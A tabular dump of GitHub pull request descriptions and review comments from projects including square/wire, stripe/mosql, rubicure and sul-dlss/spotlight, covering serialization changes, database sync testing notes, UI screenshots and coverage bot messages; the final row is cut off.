782,square/wire,130.0,"@JakeWharton  @swankjesse 

There are three improvements here:

* Deserialize repeated fields directly into an externally-immutable form
* Get rid of expensive TreeMaps to store extensions on messages
* Iterate over extensions more cheaply when serializing","['Can we finalize this?', 'LGTM', 'whoot!']"
783,square/wire,132.0,"The `redacted` extension needs to be defined externally.

@swankjesse @danrice-square @JakeWharton ","['LGTM\r\n\r\n@danrice-square ?', 'LGTM']"
784,square/wire,133.0,"Redactor will null out any redacted fields in a message.

@swankjesse @danrice-square @JakeWharton",['LGTM']
785,square/wire,145.0,"@danrice-square @loganj 
","['LG', 'LGTM with comments.']"
786,square/wire,149.0,@loganj ,"['Seems like the constructor of messages should IAE if this is passed in as an enum value as well.', 'and potentially eagerly in the builder setter.', '@JakeWharton good idea, it should be impossible to place into a repeated enum list as well.', ""@JakeWharton we need some way to get the value in there when we parse so I can't just block it in the message constructor."", 'LGTM']"
787,square/wire,151.0,@JakeWharton @jhump @swankjesse ,"[""LGTM but I'd have someone else who would actually be consuming this API review before merging."", '@dragonsinth would love your feedback on this.', '@adriancole yours as well.', ""Very high level, in retrospect I'm wondering if we did the right thing adding interceptors directly into the protobuf runtime, I didn't really question it at the time, but later wondered if we shouldn't have just built on top of protos instead of wiring directly into the core serialization layer."", ""I think you want two interfaces: `Interceptor` and `InterceptorFactory`. The factory would be invoked once per message type, and the interceptor would be invoked once per serialization/deserialization. That way the Factory gets to precompute any reflective things it needs to do, and so you avoid doing reflection during encoding.\r\n\r\nThis is how it works in Gson and although it's a bit more complicated, I think the complexity is worthwhile.\r\nhttp://google-gson.googlecode.com/svn/trunk/gson/docs/javadocs/com/google/gson/TypeAdapterFactory.html\r\n\r\n\r\n\r\n"", 'I redid the interceptors with a simple factory interface. PTAL.', 'Closing, can reopen if there is demand for tis feature.']"
788,square/wire,218.0,"The current Wire implementation has to work very hard to overcome
the lack of support for imports in JavaWriter. With JavaPoet, we
will just link everything together in the first step, and then
use fully qualified names when emitting code.

This adds a new model that adds new places for the linked elements
to live.","[""LGTM. There's two mutability points that hurt my heart: the exposed collections and result of linking. I understand the approach, though, and since linking is package-private it's probably fine. I think we'll want to wrap the exposed collections since they'll presumably be exposed to plugins."", ""I was worried you'd have higher-level concerns, like whether this is too much code. It might be, but I think it's going to help to structurally simplify the compiler internals, especially with JavaPoet to help out."", ""The registration/linker is similar to what was in the `version-two` branch that I wrote over a year ago so it was familiar. In that branch, though, I re-used the PP model for hosting the fully-qualified information by just replacing the types. I'm torn on whether re-using or having our own model here is smart."", 'Seems like this is all unreachable code until the compiler is updated to use it, which implies it is all untested code. Can this PR wait until the code is actually functional and passing tests?', ""To avoid merging untested code, and also to avoid re-reviewing a large PR, I've created a separate branch `javapoet`. https://github.com/square/wire/pull/220""]"
789,square/wire,223.0,"This trims the in-memory model rather than limiting which types are emitted
during serialization. This approach may be more reusable when using Wire to
target other languages.",['LGTMeeee']
790,square/wire,224.0,"This creates a new class TypeWriter that is mostly a conversion
of MessageWriter, but it uses linked Wire types instead of the
unlinked protoparser types.

This is successfully passing 12 of the 35 WireCompiler tests
with slight alterations to imports (JavaPoet doesn't yet support
static imports.)

The options and extensions are still to be completed. That work
should be straightforward, but I'm saving it for a follow up.
Hopefully with that change I can switch the default to be the
new JavaPoet backend.

Also add a dependency on Guava (we should have had this long ago)
and also on the snapshot of JavaPoet (which we need to include
documentation on enum constants).",['lgtm']
791,square/wire,226.0,"Now passing 19 of 35 WireCompiler tests. Still remaining are services
and options.",['lgtm']
792,stripe/mosql,63.0,"This commit is a companion to https://github.com/stripe/mongoriver/pull/11, which adds support for tokumx as mongodb alternative and revamps much of the tailer api.

r? @ebroder 

-----

For reference, notes on how I test this since this took a little bit of puzzling:

``` yaml
# Collection.yaml
test:
  test_collection:
    :columns:
    - id:
      :source: _id
      :type: TEXT
    - name:
      :source: nested.name
      :type: TEXT
    - number:
      :source: nested.int
      :type: INTEGER
    - title: TEXT
    :meta:
      :table: blog_posts
      :extra_props: true
```


Create an mongodb collection, insert a sample: `conn[""test""][""test_collection""].insert({title: ""title"", nested: {name: ""name1"", int: 5}})`

Start mosql, see if it creates table, see if database contains the record:
``` ruby
sql = Sequel.connect(""postgres://postgres@localhost"")
tailer_db = sql[:mosql_tailers]
tailer_db.all

db2 = sql[:blog_posts]
db2.all
```

Try to update and insert more to see if new ones are added:
```ruby
conn[""test""][""test_collection""].insert({title: ""title2"", nested: {name: ""name1"", int: 5}})
conn[""test""][""test_collection""].update({title: ""title2""}, {'$set' => {'nested.int' => 99}})
# restart mosql here, look to make sure no new fields are added and changes are picked up
db2.all
conn[""test""][""test_collection""].update({title: ""title2""}, {'$set' => {'nested.int' => 90}})
```

Testing if smooth updating works:
```
info = tailer_db.first
Oplog_collection.remove()
conn.drop_database(""test"")
sql.drop_table('blog_posts')
sql.drop_table('mosql_tailers')

create old style table and put an entry in it
sql.create_table?('mosql_tailers') do
  column :service,   'TEXT'
  column :timestamp, 'INTEGER'
  primary_key [:service]
end
new_info = info.dup
# new_info[:timestamp] = 1409262430
new_info.delete(:placeholder)
tailer_db = sql[:mosql_tailers]
tailer_db.insert(new_info)
# verify
tailer_db.all()
```

After restarting mosql, the blog_posts table should still be empty, but the tailers table should have an extra column filled with the new info. Adding inserts should also work.","['Yeah, I think this makes sense overall', ""This seems pretty sensible to me. I feel like we should probably write some automated tests for actual oplog tailing, even if we won't be able to run them on Travis because their mongo's are not configured with an oplog -- we can just `skip` them, and run them locally when necessary""]"
793,sue445/rubicure,30.0,#27,"['\n[![Coverage Status](https://coveralls.io/builds/1120599/badge)](https://coveralls.io/builds/1120599)\n\nCoverage increased (+0.19%) when pulling **7b75725fc2f72df6d3e39ef21d11919403e025b4 on feature/attack** into **415f7b1e6b6d08ccde2104fe2d81dda618b00ad6 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1120610/badge)](https://coveralls.io/builds/1120610)\n\nCoverage increased (+0.19%) when pulling **c0786c15a61f1960732c2bb4770621c8adfef79a on feature/attack** into **415f7b1e6b6d08ccde2104fe2d81dda618b00ad6 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1120622/badge)](https://coveralls.io/builds/1120622)\n\nCoverage increased (+0.19%) when pulling **ebad95516bd2d982f829e916e6dfe92a20ff6370 on feature/attack** into **415f7b1e6b6d08ccde2104fe2d81dda618b00ad6 on master**.\n']"
794,sue445/rubicure,36.0,"```
% ruby -rubicure -e'Cure.passion.change!'





% ruby -rubicure -e'Cure.beat.send(""! !"")'

 
4

% ruby -rubicure -e'Cure.lemonade.metamorphose!'



5
Yes5

% ruby -rubicure -e'Milky.rose.metamorphose!'
/path/rubicure/girl.rb:136:in `method_missing': undefined method `metamorphose!' for #<Rubicure::Girl > (NoMethodError)
        from -e:1:in `<main>'

% ruby -rubicure -e'Milky.rose.translate!'

 
```

()reject","['\n[![Coverage Status](https://coveralls.io/builds/1121613/badge)](https://coveralls.io/builds/1121613)\n\nCoverage increased (+0.24%) when pulling **2569711d523cf41b7b08340c2756d3f864ca58d8 on zonuexe:feature/specific_transform** into **089a24f84765582ea138d785e45d839efa7d78d4 on sue445:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1121636/badge)](https://coveralls.io/builds/1121636)\n\nCoverage increased (+0.24%) when pulling **dfd5e5e1fe822b75a5c8ac36108792ad91244300 on zonuexe:feature/specific_transform** into **089a24f84765582ea138d785e45d839efa7d78d4 on sue445:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1122310/badge)](https://coveralls.io/builds/1122310)\n\nCoverage increased (+0.44%) when pulling **f117eba460e9a4b2370ad1e8852b785bca9d82bd on zonuexe:feature/specific_transform** into **089a24f84765582ea138d785e45d839efa7d78d4 on sue445:master**.\n', '*(\xe8\xa8\xad\xe5\xae\x9a\xe3\x83\x95\xe3\x82\xa1\xe3\x82\xa4\xe3\x83\xab\xe3\x82\x92\xe6\x9b\xb8\xe3\x81\x8d\xe3\x81\xaa\xe3\x81\x8c\xe3\x82\x89\xe5\x8b\x95\xe7\x9a\x84\xe3\x81\xab\xe4\xbb\x95\xe6\xa7\x98\xe3\x82\x92\xe5\xa4\x89\xe6\x9b\xb4\xe3\x81\x97\xe3\x81\x9f\xe3\x81\x93\xe3\x81\xa8\xe3\x81\x8c\xe3\x81\xb0\xe3\x82\x8c\xe3\x81\xa1\xe3\x82\x83\xe3\x81\x86\xe2\x80\xa6)*\r\n\r\n\xe3\x81\x9d\xe3\x82\x82\xe3\x81\x9d\xe3\x82\x82\xe6\xb7\xb1\xe5\xa4\x9c\xe3\x81\xae\xe3\x83\x86\xe3\x83\xb3\xe3\x82\xb7\xe3\x83\xa7\xe3\x83\xb3\xe3\x81\xa7\xe2\x86\x93\xe3\x81\xaa\xe6\x84\x9f\xe3\x81\x98\xe3\x81\xa7\xe6\x97\xa5\xe6\x9c\xac\xe8\xaa\x9e\xe3\x83\xa1\xe3\x82\xbd\xe3\x83\x83\xe3\x83\x89\xe3\x82\x82\xe5\x8f\x97\xe7\x90\x86\xe3\x81\xa7\xe3\x81\x8d\xe3\x81\x9f\xe3\x82\x89\xe3\x81\x84\xe3\x81\x84\xe3\x82\x88\xe3\x81\xad\xe3\x80\x81\xe3\x81\xa8\xe3\x81\x84\xe3\x81\xb5\xe3\x83\xa2\xe3\x83\x81\xe3\x83\x99\xe3\x83\xbc\xe3\x82\xb7\xe3\x83\xa7\xe3\x83\xb3\xe3\x81\x8c\xe3\x81\x82\xe3\x82\x8a\xe3\x81\xbe\xe3\x81\x97\xe3\x81\x9f\xe3\x80\x82\r\n\r\n```\r\nCure.fortune.\xe3\x83\x97\xe3\x83\xaa\xe3\x82\xad\xe3\x83\xa5\xe3\x82\xa2\xe3\x83\xbb\xe3\x81\x8d\xe3\x82\x89\xe3\x82\x8a\xe3\x82\x93\xe3\x82\xb9\xe3\x82\xbf\xe3\x83\xbc\xe3\x82\xb7\xe3\x83\xb3\xe3\x83\x95\xe3\x82\xa9\xe3\x83\x8b\xe3\x83\xbc\xef\xbc\x81\r\nCure.beat.send(""\xe3\x83\xac\xe3\x83\x83\xe3\x83\x84\xe3\x83\x97\xe3\x83\xac\xe3\x82\xa4! \xe3\x83\x97\xe3\x83\xaa\xe3\x82\xad\xe3\x83\xa5\xe3\x82\xa2\xe3\x83\xbb\xe3\x83\xa2\xe3\x82\xb8\xe3\x83\xa5\xe3\x83\xac\xe3\x83\xbc\xe3\x82\xb7\xe3\x83\xa7\xe3\x83\xb3\xef\xbc\x81"")\r\n[Cure.black, Cure.white].map(&:\xe3\x83\x87\xe3\x83\xa5\xe3\x82\xa2\xe3\x83\xab\xe3\x83\xbb\xe3\x82\xaa\xe3\x83\xbc\xe3\x83\xad\xe3\x83\xa9\xe3\x83\xbb\xe3\x82\xa6\xe3\x82\xa7\xe3\x83\xbc\xe3\x83\x96\xef\xbc\x81)\r\n```\r\n\r\n\xe3\x81\x9d\xe3\x81\xae\xe3\x81\x9f\xe3\x82\x81\xe3\x81\xae\xe8\xa1\xa8\xe8\xa8\x98\xe6\x8f\xba\xe3\x82\x8c\xe5\xaf\xbe\xe7\xad\x96\xe3\x81\xab\xe5\x85\xa8\xe3\x81\xa6\xe5\x8d\x98\xe8\xaa\x9e\xe9\x96\x93\xe3\x81\xae\xe5\x8c\xba\xe5\x88\x87\xe3\x82\x8a\xe3\x81\xaa\xe3\x81\x97\xe3\x81\xa7\xe8\xa9\xb0\xe3\x82\x81\xe3\x81\xa6\xe6\x9b\xb8\xe3\x81\x84\xe3\x81\xa6\xe3\x81\x9f\xe3\x81\xae\xe3\x81\xa7\xe3\x80\x81\xe6\x97\xa5\xe6\x9c\xac\xe8\xaa\x9e\xe3\x83\xa1\xe3\x82\xbd\xe3\x83\x83\xe3\x83\x89\xe5\xaf\xbe\xe5\xbf\x9c\xe3\x81\x97\xe3\x81\xaa\xe3\x81\x84\xe6\x96\xb9\xe5\x90\x91\xe3\x81\xaa\xe3\x82\x89\xe3\x81\xb0\xe3\x80\x81\xe5\x85\xa8\xe3\x81\xa6Ruby\xe3\x81\xae\xe3\x83\xa1\xe3\x82\xbd\xe3\x83\x83\xe3\x83\x89\xe3\x81\xa3\xe3\x81\xbd\xe3\x81\x8f\xe5\x8d\x98\xe8\xaa\x9e\xe3\x82\x92`_`\xe3\x81\xa7\xe5\x8c\xba\xe5\x88\x87\xe3\x81\xa3\xe3\x81\x9f\xe6\x96\xb9\xe3\x81\x8c\xe3\x81\x84\xe3\x81\x84\xe3\x81\xa7\xe3\x81\x99\xe3\x81\xad\xe3\x80\x82', '\n[![Coverage Status](https://coveralls.io/builds/1122338/badge)](https://coveralls.io/builds/1122338)\n\nCoverage increased (+0.43%) when pulling **e9cb5f5269d7945b615f519350233a05e12e4740 on zonuexe:feature/specific_transform** into **089a24f84765582ea138d785e45d839efa7d78d4 on sue445:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1122353/badge)](https://coveralls.io/builds/1122353)\n\nCoverage increased (+0.42%) when pulling **0af7064002f482793415f1476fa04a26b3f03e0b on zonuexe:feature/specific_transform** into **089a24f84765582ea138d785e45d839efa7d78d4 on sue445:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1122359/badge)](https://coveralls.io/builds/1122359)\n\nCoverage increased (+0.42%) when pulling **46f43972b50cdb2e5bbef77b79430b4d70056fd5 on zonuexe:feature/specific_transform** into **089a24f84765582ea138d785e45d839efa7d78d4 on sue445:master**.\n', '[![LGTM](http://www.lgtm.in/p/UyNyahbhq)](http://www.lgtm.in/i/UyNyahbhq)']"
795,sue445/rubicure,66.0,"# TODO
* [x] cast_name
* [x] color
* [x] cure_flora created_date
* [x] cure_mermaid created_date
* [x] cure_twinkle created_date","['\n[![Coverage Status](https://coveralls.io/builds/1678252/badge)](https://coveralls.io/builds/1678252)\n\nCoverage remained the same when pulling **b7b7e65e2d782ee8cb2100011d749b933e8a2aa7 on feature/go_princess_precure_0.2.0** into **5ddb04da497df58d74b90cafbdf56e86198612ad on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1761914/badge)](https://coveralls.io/builds/1761914)\n\nCoverage remained the same when pulling **9ab5eef7ff5b5ea6c3c1ed5379a2bdd54453bacf on feature/go_princess_precure_0.2.0** into **5424151aaa4e4937970bd4af1b4dfe98554ba8ae on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1841488/badge)](https://coveralls.io/builds/1841488)\n\nCoverage remained the same at 95.09% when pulling **faa6b21f9d9a1babf2194efcdddf8fb6033df347 on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1846939/badge)](https://coveralls.io/builds/1846939)\n\nCoverage remained the same at 95.09% when pulling **f55adb2f40780fae89e19ad1619f01f8207fd021 on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1846939/badge)](https://coveralls.io/builds/1846939)\n\nCoverage remained the same at 95.09% when pulling **f55adb2f40780fae89e19ad1619f01f8207fd021 on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1847348/badge)](https://coveralls.io/builds/1847348)\n\nCoverage remained the same at 95.09% when pulling **05852fa36d66c8841ddb7b483a3f66bca356b5c6 on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1847348/badge)](https://coveralls.io/builds/1847348)\n\nCoverage remained the same at 95.09% when pulling **05852fa36d66c8841ddb7b483a3f66bca356b5c6 on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1847691/badge)](https://coveralls.io/builds/1847691)\n\nCoverage remained the same at 95.09% when pulling **4021c7046c39297c3692af88717288f8484363ea on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1847709/badge)](https://coveralls.io/builds/1847709)\n\nCoverage remained the same at 95.09% when pulling **608b35812af47f704809b08fe34876e9fbca6b08 on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1885259/badge)](https://coveralls.io/builds/1885259)\n\nCoverage remained the same at 95.09% when pulling **f3cec86a640318abf95c3e86c2d18355c4a204fa on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1887593/badge)](https://coveralls.io/builds/1887593)\n\nCoverage remained the same at 95.09% when pulling **96a429bbd15597e448120617ecb2377ab995f6d0 on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1887593/badge)](https://coveralls.io/builds/1887593)\n\nCoverage remained the same at 95.09% when pulling **96a429bbd15597e448120617ecb2377ab995f6d0 on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1971642/badge)](https://coveralls.io/builds/1971642)\n\nCoverage remained the same at 95.09% when pulling **ebc53a033ca4a833002527148eb304e6e5f5b3b3 on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1971642/badge)](https://coveralls.io/builds/1971642)\n\nCoverage remained the same at 95.09% when pulling **ebc53a033ca4a833002527148eb304e6e5f5b3b3 on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1971654/badge)](https://coveralls.io/builds/1971654)\n\nCoverage remained the same at 95.09% when pulling **77790201adbbc63537c45f62948105b83b2e4ec2 on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1971659/badge)](https://coveralls.io/builds/1971659)\n\nCoverage remained the same at 95.09% when pulling **77790201adbbc63537c45f62948105b83b2e4ec2 on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1971659/badge)](https://coveralls.io/builds/1971659)\n\nCoverage remained the same at 95.09% when pulling **77790201adbbc63537c45f62948105b83b2e4ec2 on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1971659/badge)](https://coveralls.io/builds/1971659)\n\nCoverage remained the same at 95.09% when pulling **77790201adbbc63537c45f62948105b83b2e4ec2 on feature/go_princess_precure_0.2.0** into **9d75e82dfb9c84313506dba2de8b3a77116679c2 on master**.\n']"
796,sul-dlss/spotlight,237.0,"Fixes #232 

`PagesController#show`
![screen shot 2014-02-18 at 12 17 13 pm](https://f.cloud.github.com/assets/96776/2199851/b7114bf8-98d9-11e3-8db5-2d11e28f5e4a.png)

`PagesController#edit`
![screen shot 2014-02-18 at 12 12 57 pm](https://f.cloud.github.com/assets/96776/2199855/bb8971c4-98d9-11e3-9cf9-e32b865d9944.png)
",[]
797,sul-dlss/spotlight,254.0,"The Public checkbox is submitted via ajax so this adds a function as
a 'success' callback to toggle the label in the thumbnail-image div.

Fixes #246 

![screen shot 2014-02-19 at 10 01 45 pm](https://f.cloud.github.com/assets/96776/2215543/a176999e-99f4-11e3-9617-c698f27a4758.png)
",[]
798,sul-dlss/spotlight,336.0,...s #293,"['\n[![Coverage Status](https://coveralls.io/builds/549535/badge)](https://coveralls.io/builds/549535)\n\nCoverage remained the same when pulling **249b49df988db0e76b3f26b3609b4024df5a9473 on ngrams** into **3a451b9f0a0d987cc4564aec31b82aeadeb2ac0b on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/552202/badge)](https://coveralls.io/builds/552202)\n\nCoverage increased (+0.13%) when pulling **eb88a05251206edcbe31b9ca6ca6d369cd70dd91 on ngrams** into **9ceffbe82c426a5be61b68bfc5c9fc3e8d932e48 on master**.\n', ""I think trial and error makes sense -- I haven't worked with n-grams, just character bigrams, so I'm not any more informed here.   I suggest thinking about what you want and coding up some tests with test data to ensure you get the desired behavior."", '\n[![Coverage Status](https://coveralls.io/builds/552346/badge)](https://coveralls.io/builds/552346)\n\nCoverage increased (+0.13%) when pulling **eb88a05251206edcbe31b9ca6ca6d369cd70dd91 on ngrams** into **9ceffbe82c426a5be61b68bfc5c9fc3e8d932e48 on master**.\n']"
799,sul-dlss/spotlight,385.0,,"['It appears that the super admin does not have the ability to view the Users page of the exhibit administration ( e.g. /spotlight/**exhibit title**/roles ).  I\'m receiving the ""You are not authorized to access this page."" flash error on only the Users administration.', ""Thanks, looks like Roles isn't quite using cancan. "", "":+1: looks good from my perspective now.  I'll let you and @jcoyne hash out the rest of the issues."", '\n[![Coverage Status](https://coveralls.io/builds/556679/badge)](https://coveralls.io/builds/556679)\n\nCoverage decreased (-0.26%) when pulling **d6d2d77af42dded27281864601077da3b17abd38 on super-destroy** into **364f42267b87ed1d5dc5686997d07b76d766a3a7 on master**.\n']"
800,sul-dlss/spotlight,842.0,"Closes #833 Closes #840 

![admin-header](https://cloud.githubusercontent.com/assets/96776/5685219/22eec1d0-97ed-11e4-9e92-b3324f3e37ba.png)

![single-non-repo-item-form](https://cloud.githubusercontent.com/assets/96776/5685223/2586c870-97ed-11e4-9177-7589cced0c08.png)

![upload](https://cloud.githubusercontent.com/assets/96776/5685226/2755b440-97ed-11e4-811e-d1828447cc0a.gif)
","['Nice.', ""@cbeer :+1: thanks for the suggestions.  I pushed some commits to resolve the issues you mentioned except for the `build_resource` before filter.  CanCan did not appear to be loading the resource correctly but that could be my naivet\xc3\xa9 of CanCan.\r\n\r\nI put these up as separate commits so you can see the changes.  I'll squash before merging."", ':shipit: ', 'Squashed.']"
801,sul-dlss/spotlight,930.0,"Closes #914 

Still working out some kinks w/ the tests.  Also, @ggeisler can you take a look at the 5 category w/ no-sidebar on different view-ports.  Under certain circumstances I see the categories overlapping.

TODO:
- [x] Use variables for height, width, colors, etc.
- [x] Pick and set a good fallback size for the browse categories (falling back on smallest square).
- [x] Store browse category slug instead of ID.
- [x] Make `Show item counts` enabled by default.

## Edit form
![edit](https://cloud.githubusercontent.com/assets/96776/6090395/4f345fb6-ae2c-11e4-9ddd-84b693490efa.png)

## With Sidebar
![sidebar-2](https://cloud.githubusercontent.com/assets/96776/6090396/4f3531fc-ae2c-11e4-8359-c051feba7160.png)

![sidebar-3](https://cloud.githubusercontent.com/assets/96776/6090398/4f38b5b6-ae2c-11e4-93df-69d359c005f3.png)


## Without Sidebar
![no-sidebar-2](https://cloud.githubusercontent.com/assets/96776/6090393/4f33e48c-ae2c-11e4-9fb7-c1975c94c51d.png)
![no-sidebar-3](https://cloud.githubusercontent.com/assets/96776/6090394/4f33c7a4-ae2c-11e4-9f18-cad327c6f8be.png)
![no-sidebar-4](https://cloud.githubusercontent.com/assets/96776/6090399/4f4af816-ae2c-11e4-8c2c-ef8172cfdf37.png)
![no-sidebar-5](https://cloud.githubusercontent.com/assets/96776/6090397/4f385f80-ae2c-11e4-8c25-f06480bdccce.png)
","['\n[![Coverage Status](https://coveralls.io/builds/1881983/badge)](https://coveralls.io/builds/1881983)\n\nCoverage decreased (-0.2%) to 96.15% when pulling **a72ac4c1a10e9a6eaa449c6cc3a98990b4633805 on 914-browse-cat-widget** into **4b950fbca41882e8619798da7ba1cff643c95446 on master**.\n', ':+1: Nice', ""Looking good, @jkeck! Regarding the overlapping image problem you see with 5-up, in the original ticket I suggested we hide the 5th image at the medium breakpoint (992px-1199px). It looks like the code currently doesn't hide any images below 1200px, so that's why the overlap. However, even hiding the 5th image isn't enough to prevent overlap at the small breakpoint, so here is what I suggest:\r\n\r\nFor the 4- or 5-up version (220px image version):\r\n\r\n- give the `box category-5` div the equivalent of the Bootstrap `hidden-sm hidden-md` classes (hide 5th div between 768px and 1199px) \r\n- give the `box category-4` div the equivalent of the Bootstrap `hidden-sm` classes (hide 4th div between 768px and 991px) \r\n\r\nFor the 2- or 3-up version (larger image version):\r\n\r\n- give the `box category-3` div the equivalent of the Bootstrap `hidden-sm` class (hide\r\n 3th div between 768px and 991px) \r\n\r\nThat would give us this at the small viewport (this is the worst case, hiding 1 of 3 large and 2 of 5 small images):\r\n\r\n![default_exhibit_-_blacklight](https://cloud.githubusercontent.com/assets/101482/6111967/a7e14cac-b041-11e4-9da2-3907b7d7d247.png)\r\n\r\nThere is still some overlap and general unattractiveness below the small viewport, but that's the case with other widgets too, so perhaps we should push worrying about that to another ticket I can create to focus on improving extra-small responsiveness more broadly?"", 'Also, can you make the ""Include item counts?"" checkbox `true` as the default?', ""@ggeisler okay, check out what I've done in 0b80e1009ed626369eb2290593743b9bfae1b0d6 and let me know if that works for you.\r\n\r\n![5-up-resize](https://cloud.githubusercontent.com/assets/96776/6281214/1a970d5e-b871-11e4-90fc-496c6a8a07b7.gif)\r\n"", ""I'll rebase before we :shipit:, just leaving as is now for readability."", ':+1: ', ""@jkeck this is great. One minor suggestion is to add `background-position: center;` to the `.browse-category` class, which will center the images. It's not a huge improvement with the maps (see below for a simple example) since they have the black borders, but for a photography collection like Fitch I think it'll be a noticeable improvement to center the images.\r\n\r\n![maps_of_africa__an_online_exhibit_-_blacklight](https://cloud.githubusercontent.com/assets/101482/6299603/936a5aaa-b8db-11e4-9b4e-81488fcd925d.png)\r\n"", '@ggeisler: \r\n![background-center](https://cloud.githubusercontent.com/assets/96776/6307065/c0284504-b8ed-11e4-9343-7595f2dfedf3.png)\r\n', '\n[![Coverage Status](https://coveralls.io/builds/1965845/badge)](https://coveralls.io/builds/1965845)\n\nCoverage increased (+0.08%) to 95.47% when pulling **0069ec173c62cdb1d485d506c31ca91222ebc9b9 on 914-browse-cat-widget** into **dc1a767575858fcc0f8e30ddd8061cfd7ef2c328 on master**.\n', '@jkeck looks good!\r\n\r\n$legend-border-color is fine to use for $featured-browse-category-border-color (currently #b3b3b3).\r\n', ""Okay, updated the font sizes, border radius, and colors to use existing bootstrap variables.\r\n\r\n![new-borders-and-colors](https://cloud.githubusercontent.com/assets/96776/6308712/5c766a46-b8fb-11e4-9e2b-3e1db57b9328.png)\r\n\r\nWRT the image sizes proportional to the bootstrap container size variables, I'm just not confident enough in my knowledge of the rational behind the image sizes in the first place and whether there would be unintended consequences to pinning to those sizes.\r\n\r\nWhat would you think about me creating a ticket to investigate using bootstrap's container sizes to calculate the image sizes dynamically in the future?"", ':+1: ', ""That's it, I promise. Ship at will."", ':shipit: ', 'Last two variables added and commits squashed.']"
802,sul-dlss/spotlight,997.0,"![screen shot 2015-03-05 at 10 20 37 am](https://cloud.githubusercontent.com/assets/111218/6511369/4a63edf8-c321-11e4-84c5-ce0116b53ebd.png)
![screen shot 2015-03-05 at 10 20 54 am](https://cloud.githubusercontent.com/assets/111218/6511381/53278454-c321-11e4-8e01-34ca9b1f7325.png)
![screen shot 2015-03-05 at 10 21 13 am](https://cloud.githubusercontent.com/assets/111218/6511389/61e5c244-c321-11e4-83a7-a9adf809e5a4.png)
![screen shot 2015-03-05 at 10 53 24 am](https://cloud.githubusercontent.com/assets/111218/6512058/ee5a30bc-c325-11e4-9513-1bbc53166269.png)
![screen shot 2015-03-05 at 10 53 13 am](https://cloud.githubusercontent.com/assets/111218/6512059/ee69cc16-c325-11e4-9b82-50500b1afad3.png)
","[""Looking good so far.  I'll have to look a little closer tomorrow because I'm noticing a couple of oddities (some of which may not be related to this PR at all).\r\n\r\nOne thing that is totally non-critical is that the document that we get the default thumb from is not pre-selected for browse categories (you may have also mentioned that was more trouble than it's worth to put the default document's global-id in there automatically).\r\n\r\n![no-item-selected](https://cloud.githubusercontent.com/assets/96776/6500388/01db41e6-c2c0-11e4-8b78-3c1edcd14bd1.png)\r\n"", ""Okay, all looks good except for the couple of (non-blocker) things I mentioned (some of which you've already addressed).  :+1: great work."", ""Good point on the item context. I've tried to address it, so we'll see if it works..""]"
803,sul-dlss/spotlight,1134.0,,"['\n[![Coverage Status](https://coveralls.io/builds/2294407/badge)](https://coveralls.io/builds/2294407)\n\nCoverage decreased (-0.09%) to 95.86% when pulling **348a9b80df55a6d61466ee058e49b6394830e152 on rubocop** into **9714697c76d832688331a55a4d6a326fa11484fb on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2302044/badge)](https://coveralls.io/builds/2302044)\n\nCoverage decreased (-0.39%) to 95.57% when pulling **c746c6c744726b29493b178d1058490199d0c83d on rubocop** into **9714697c76d832688331a55a4d6a326fa11484fb on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2303246/badge)](https://coveralls.io/builds/2303246)\n\nCoverage decreased (-0.39%) to 95.57% when pulling **0e36278f1397caeb472291ebdfd20ed79eb1ce32 on rubocop** into **9714697c76d832688331a55a4d6a326fa11484fb on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2306064/badge)](https://coveralls.io/builds/2306064)\n\nCoverage decreased (-0.31%) to 95.65% when pulling **a60ac88ce028ddd4d5a0b433792197e78d425d03 on rubocop** into **3c9f0c0acfe2775d5332d9b218c7351cb2ad9b2e on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2306097/badge)](https://coveralls.io/builds/2306097)\n\nCoverage decreased (-0.31%) to 95.65% when pulling **a60ac88ce028ddd4d5a0b433792197e78d425d03 on 